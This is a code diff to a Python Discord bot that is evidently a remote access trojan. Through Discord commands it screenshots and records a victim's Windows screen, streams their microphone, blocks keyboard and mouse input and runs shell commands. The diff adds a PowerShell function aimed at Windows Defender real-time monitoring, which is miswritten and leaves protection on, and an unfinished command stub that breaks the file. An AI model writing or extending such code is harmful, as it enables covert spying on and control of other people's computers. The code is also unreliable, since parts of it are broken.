@@ -7,7 +7,7 @@ import string
 import random
 import tempfile
 import winreg
-import pyscreenshot 
+import pyscreenshot
 import cv2
 import mss  # Import mss for screen capture
 import numpy as np
@@ -18,7 +18,9 @@ import subprocess
 # Load environment variables
 load_dotenv()
 TOKEN = os.getenv("DISCORD_BOT_TOKEN")
-SERVER_ID = int(os.getenv("SERVER_ID"))
+SERVER_ID = os.getenv("SERVER_ID")
+SERVER_ID = int(SERVER_ID)
+
 
 # Bot setup
 intents = discord.Intents.all()
@@ -36,6 +38,21 @@ CHANNELS = 2
 RATE = 48000
 CURRENT_DIRECTORY = os.path.dirname(os.path.abspath(__file__))
 PWD = 'C:\\'
+
+def disable_real_time_protection():
+    command =  ['powershell', '-Command', 'Set-MpPreference -DisableRealtimeMonitoring $false']
+    try:
+        result = subprocess.run(command, capture_output=True, text=True, check=True)
+        return (result.stdout, result.stderr)
+    except subprocess.CalledProcessError as e:
+        return (e.returncode, e.output, e.stderr)
+
+
+
+
+
+
+
 class PyAudioPCM(discord.AudioSource):
     def __init__(self, channels=CHANNELS, rate=RATE, chunk=CHUNK, input_device=1) -> None:
         print("Initializing PyAudioPCM...")
@@ -78,7 +95,7 @@ async def prep_for_discord(guild, channel_names, prefix_for_marking, delete_old_
     """Prepare categories and channels in the Discord guild."""
     category_name = prefix_for_marking + session_name
     category = discord.utils.get(guild.categories, name=category_name)
-    
+
     if not category:
         try:
             category = await guild.create_category(name=category_name)
@@ -118,7 +135,7 @@ async def on_ready():
     global session_name
     global PWD
     print(f'Logged in as {bot.user}!')
-    
+
     guild = bot.get_guild(SERVER_ID)
     if not guild:
         print(f"Guild with ID {SERVER_ID} not found.")
@@ -144,8 +161,8 @@ async def on_ready():
                     break
     # shutil.move('libopus-0.dll', os.path.join(TEMP_DIR, 'libopus-0.dll'))
     discord.opus.load_opus(os.path.join(CURRENT_DIRECTORY, 'libopus-0.x64.dll'))
-    if os.path.isfile(os.path.join(TEMP_DIR, "pwd.txt")):
-        with open(os.path.join(TEMP_DIR, "pwd.txt") , 'r' ) as f:
+    if os.path.isfile(os.path.join(TEMP_DIR,session_name + SUFFIX_FOR_MARKING, "pwd.txt")):
+        with open(os.path.join(TEMP_DIR,session_name + SUFFIX_FOR_MARKING, "pwd.txt") , 'r' ) as f:
             PWD = f.read()
 
 
@@ -156,11 +173,11 @@ async def screenshot(ctx):
         name = random_ascii(5) + ".png"  # Ensure file extension is added
         screenshot_path = os.path.join(TEMP_DIR, name)
         screenshot.save(screenshot_path)
-        
+
         # Send the screenshot
         with open(screenshot_path, 'rb') as f:
             await ctx.send(file=discord.File(f, 'Screenshot.png'))
-        
+
         # Clean up
         os.remove(screenshot_path)
     except Exception as e:
@@ -236,7 +253,7 @@ async def record_screen(ctx, duration: int = 5):
             img = sct.grab(monitor)
             frame = np.array(img)  # Convert the captured image to a numpy array
             frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)  # Convert BGRA to BGR format for OpenCV
-            
+
             # Write the frame to the output file
             out.write(frame)
             frame_count += 1
@@ -262,7 +279,7 @@ async def join(ctx):
             await ctx.voice_client.move_to(voice_channel)
         else:
             await voice_channel.connect(self_deaf=True)
-        
+
         # Start streaming audio from the microphone
         if ctx.voice_client:
             ctx.voice_client.play(PyAudioPCM())
@@ -292,7 +309,7 @@ async def blockinput(ctx):
     keyboard_listener.start()
     mouse_listener.start()
     await ctx.send("`Blocked user input`")
-    
+
 @bot.command(name='unblockinput')
 async def unblockinput(ctx):
     keyboard_listener.stop()
@@ -325,12 +342,18 @@ async def cmd(ctx,timeout=10, *args):
 @bot.command(name='cd')
 async def cd(ctx, name):
     global PWD
+    global session_name
+    global SUFFIX_FOR_MARKING
     PWD = os.path.join(PWD, name)
-    with open(os.path.join(TEMP_DIR, "pwd.txt") ,'w') as f:
+    with open(os.path.join(TEMP_DIR,session_name + SUFFIX_FOR_MARKING, "pwd.txt") ,'w') as f:
         f.write(PWD)
     await ctx.send(f"`Directory changed:{PWD}`")
 @bot.command(name='kms')
 async def kms(ctx):
     await ctx.send("`bruu why would u kill meee???? >:( `")
     exit()
+@bot.command(name='disabletsk')
+async def disabletsk(ctx):
+
+
 bot.run(TOKEN)
